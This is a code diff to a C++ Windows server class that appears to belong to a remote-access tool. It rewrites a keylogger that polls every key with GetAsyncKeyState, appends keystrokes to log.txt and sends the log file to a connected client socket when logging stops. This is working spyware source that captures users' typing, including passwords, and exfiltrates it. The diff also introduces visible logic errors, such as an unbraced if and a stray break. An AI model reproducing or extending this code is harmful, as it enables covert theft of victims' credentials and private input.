@@ -338,66 +338,64 @@ void Server::restartServer(){
 }
 
 
-// Check if a key is currently pressed
-
-
-// Function to start keylogger
-
-
-
+//Keylogger
 void Server::startKeyLogger() {
     isLogging = true;
-    if (!keyLoggerThread.joinable()) {
+    if (!keyLoggerThread.joinable()) 
         keyLoggerThread = std::thread(&Server::keyLogger, this);
         std::cout << "Keylogger started.\n";
-    }
 }
 
 // Function to stop keylogger and send log file to client
 void Server::stopKeyLogger(SOCKET clientSocket) {
     isLogging = false;
-    std::cout << "Setting isLogging to false to stop keylogger.\n";
-
-    if (keyLoggerThread.joinable()) {
-        keyLoggerThread.join();
-    } else {
-        std::cerr << "Keylogger thread was not joinable.\n";
-    }
+    if (keyLoggerThread.joinable()) 
+        keyLoggerThread.join();   
+    copyFileAndSend(clientSocket, "log.txt", "log.txt");
     
-    // Send the log file to the client after stopping
-    copyFileAndSend(clientSocket, logFilePath, logFilePath);
 }
 
-// Main keylogger function
 void Server::keyLogger() {
-    // FreeConsole();
-   
-    FILE* OUTPUT_FILE = fopen(logFilePath.c_str(), "a+");
-    if (OUTPUT_FILE == nullptr) return;
+    std::ofstream outputFile("log.txt", std::ios::app);  // Open file in append mode
+    if (!outputFile.is_open()) {
+        std::cerr << "Failed to open log file for writing.\n";
+        return;
+    }
+
+    std::map<int, std::string> keyMap = {
+        {VK_BACK, "[BACKSPACE]"},
+        {VK_RETURN, "[ENTER]"},
+        {VK_TAB, "[TAB]"},
+        {VK_ESCAPE, "[ESCAPE]"},
+        {VK_CONTROL, "[CTRL]"},
+        {VK_MENU, "[ALT]"},
+        {VK_SPACE, "[SPACE]"},
+        {VK_CAPITAL, "[CAPSLOCK]"},
+        {VK_SHIFT, "[SHIFT]"}
+    };
 
     while (isLogging) {
         Sleep(10);
-        std::cout << "Logging active...\n"; // Debug output to confirm loop entry
         for (int i = 8; i <= 255; i++) {
             if (GetAsyncKeyState(i) == -32767) {
                 std::lock_guard<std::mutex> lock(logMutex);
-                switch (i) {
-                    case VK_SHIFT: fprintf(OUTPUT_FILE, "[SHIFT]"); break;
-                    case VK_BACK: fprintf(OUTPUT_FILE, "[BACKSPACE]"); break;
-                    case VK_RETURN: fprintf(OUTPUT_FILE, "[ENTER]"); break;
-                    case VK_TAB: fprintf(OUTPUT_FILE, "[TAB]"); break;
-                    case VK_ESCAPE: fprintf(OUTPUT_FILE, "[ESCAPE]"); break;
-                    case VK_CONTROL: fprintf(OUTPUT_FILE, "[CTRL]"); break;
-                    case VK_MENU: fprintf(OUTPUT_FILE, "[ALT]"); break;
-                    case VK_SPACE: fprintf(OUTPUT_FILE, "[SPACE]"); break;
-                    default: fprintf(OUTPUT_FILE, "%c", i); break;
+                // Check if the key is in the special key map
+                auto it = keyMap.find(i);
+                if (it != keyMap.end()) {
+                    outputFile << it->second;  //Dpecial keys
+                } else {
+                    if ((i >= 0x30 && i <= 0x39) ||    // Numbers 0-9
+                            (i >= 0x41 && i <= 0x5A)) {  // Letters A-Z and a-z
+                            outputFile << static_cast<char>(i);
+                        }
+                        break;
                 }
-                fflush(OUTPUT_FILE);
+                outputFile.flush();  // Flush after each keystroke
             }
         }
     }
-    std::cout << "Logging stopped.\n"; // Indicates that logging stopped properly
-    fclose(OUTPUT_FILE);
+    outputFile.close();  
 }
+
 
 
